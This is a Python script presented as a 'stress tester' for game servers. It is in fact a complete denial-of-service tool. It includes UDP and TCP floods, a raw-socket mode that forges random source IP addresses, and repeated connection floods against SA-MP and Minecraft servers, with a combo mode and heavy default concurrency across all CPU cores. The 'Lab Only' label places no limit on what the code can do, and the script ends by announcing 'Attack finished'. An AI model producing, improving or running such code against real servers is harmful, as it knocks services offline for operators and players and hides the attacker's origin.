#!/usr/bin/env python3
"""
Universal Game Server Stress Tester v2 (Optimized)
Supports modes: udp, tcp, udp-spoof, samp, mc, combo
"""

import argparse
import asyncio
import multiprocessing
import threading
import socket
import struct
import random
import time
import os
import psutil

# —— Helpers ——

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_udp_packet(src: str, dst: str, dport: int, size: int) -> bytes:
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
        (4 << 4) | 5, 0, 20 + 8 + size, random.randint(0, 65535),
        0, 64, socket.IPPROTO_UDP, 0,
        socket.inet_aton(src), socket.inet_aton(dst)
    )
    udp_hdr = struct.pack('!HHHH',
        random.randint(1024, 65535), dport, 8 + size, 0
    )
    return ip_hdr + udp_hdr + os.urandom(size)

def encode_varint(v: int) -> bytes:
    b = b''
    while True:
        temp = v & 0x7F
        v >>= 7
        if v:
            temp |= 0x80
        b += struct.pack('B', temp)
        if not v:
            break
    return b

def make_mc(host: str, port: int) -> bytes:
    hs = (
        encode_varint(754)
        + encode_varint(len(host)) + host.encode()
        + struct.pack('>H', port)
        + encode_varint(1)
    )
    return encode_varint(len(hs) + 1) + b'\x00' + hs + b'\x01\x00'

def make_samp(host: str, port: int) -> bytes:
    return b'SAMP' + socket.inet_aton(host) + struct.pack('>H', port) + b'i'

# —— Optimized async workers ——

async def udp_worker(host, port, pkt_pool, delay_pool, stop_time, stats):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sendto = sock.sendto
    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)

    i = 0
    now = time.time
    while True:
        if now() >= stop_time:
            break
        sendto(pkt_pool[i % pkt_count], (host, port))
        stats['sent'] += 1
        await asyncio.sleep(delay_pool[i % delay_count])
        i += 1
    sock.close()

async def tcp_worker(host, port, pkt_pool, delay_pool, stop_time, stats):
    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)
    now = time.time
    i = 0
    while True:
        if now() >= stop_time:
            break
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=1
            )
            writer.write(pkt_pool[i % pkt_count])
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        stats['sent'] += 1
        await asyncio.sleep(delay_pool[i % delay_count])
        i += 1

async def udp_spoof_worker(host, port, pkt_pool, delay_pool, stop_time, stats):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print("[!] Root privileges required for raw sockets.")
        return
    sendto = sock.sendto
    pkt_count = len(pkt_pool)
    delay_count = len(delay_pool)
    now = time.time
    i = 0
    while True:
        if now() >= stop_time:
            break
        sendto(pkt_pool[i % pkt_count], (host, port))
        stats['sent'] += 1
        await asyncio.sleep(delay_pool[i % delay_count])
        i += 1
    sock.close()

async def samp_worker(host, port, _pkt_pool, delay_pool, stop_time, stats):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sendto = sock.sendto
    pkt = make_samp(host, port)
    delay_count = len(delay_pool)
    now = time.time
    i = 0
    while True:
        if now() >= stop_time:
            break
        sendto(pkt, (host, port))
        stats['sent'] += 1
        await asyncio.sleep(delay_pool[i % delay_count])
        i += 1
    sock.close()

async def mc_worker(host, port, _pkt_pool, delay_pool, stop_time, stats):
    pkt = make_mc(host, port)
    delay_count = len(delay_pool)
    now = time.time
    i = 0
    while True:
        if now() >= stop_time:
            break
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=1
            )
            writer.write(pkt)
            await writer.drain()
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        stats['sent'] += 1
        await asyncio.sleep(delay_pool[i % delay_count])
        i += 1

# —— Stats printer ——

def stats_printer(mode: str, stats: dict, interval: float = 1.0):
    prev = 0
    cpu_sample_timer = 0
    while not stats.get('done', False):
        time.sleep(interval)
        sent = stats['sent'] - prev
        prev = stats['sent']
        cpu_sample_timer += interval
        cpu = psutil.cpu_percent(interval=None) if cpu_sample_timer >= 5 else "..."
        if cpu_sample_timer >= 5:
            cpu_sample_timer = 0
        print(f"[{mode.upper()}] {sent} pkt/s — Total: {stats['sent']} — CPU: {cpu}")

# —— Process runner ——

def run_process(args, mode: str, worker_func):
    stats = {'sent': 0, 'done': False}
    stop_time = time.time() + args.duration

    # Pools pre-generados
    pkt_pool = [os.urandom(random.randint(args.min_pkt, args.max_pkt)) for _ in range(50)]
    if mode == 'udp-spoof':
        pkt_pool = [build_udp_packet(random_ip(), args.host, args.port,
                                     random.randint(args.min_pkt, args.max_pkt))
                    for _ in range(50)]
    delay_pool = [max(0, args.delay + random.uniform(-args.jitter, args.jitter)) for _ in range(50)]

    t_stats = threading.Thread(target=stats_printer, args=(mode, stats), daemon=True)
    t_stats.start()

    async def main_loop():
        tasks = [
            worker_func(args.host, args.port, pkt_pool, delay_pool, stop_time, stats)
            for _ in range(args.concurrency)
        ]
        await asyncio.gather(*tasks)
        stats['done'] = True

    asyncio.run(main_loop())
    t_stats.join()

# —— CLI ——

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal Stress Tester v2 (Optimized, Lab Only)")
    parser.add_argument("mode", choices=['udp', 'tcp', 'udp-spoof', 'samp', 'mc', 'combo'])
    parser.add_argument("host")
    parser.add_argument("-p", "--port", type=int, default=25565)
    parser.add_argument("--min-pkt", type=int, default=512)
    parser.add_argument("--max-pkt", type=int, default=2048)
    parser.add_argument("-d", "--duration", type=int, default=60)
    parser.add_argument("--delay", type=float, default=0.01)
    parser.add_argument("--jitter", type=float, default=0.005)
    parser.add_argument("-c", "--concurrency", type=int, default=multiprocessing.cpu_count() * 50)
    parser.add_argument("-P", "--processes", type=int, default=multiprocessing.cpu_count())
    args = parser.parse_args()

    funcs = {
        'udp': udp_worker,
        'tcp': tcp_worker,
        'udp-spoof': udp_spoof_worker,
        'samp': samp_worker,
        'mc': mc_worker
    }

    modes = [args.mode] if args.mode != 'combo' else ['udp', 'tcp', 'samp', 'mc']
    procs = []
    for mode in modes:
        func = funcs.get(mode)
        if not func:
            continue
        print(f"[+] Mode: {mode} | Concurrency: {args.concurrency} | Processes: {args.processes}")
        for _ in range(args.processes):
            p = multiprocessing.Process(target=run_process, args=(args, mode, func))
            p.start()
            procs.append(p)
    for p in procs:
        p.join()

    print("[+] Attack finished.")
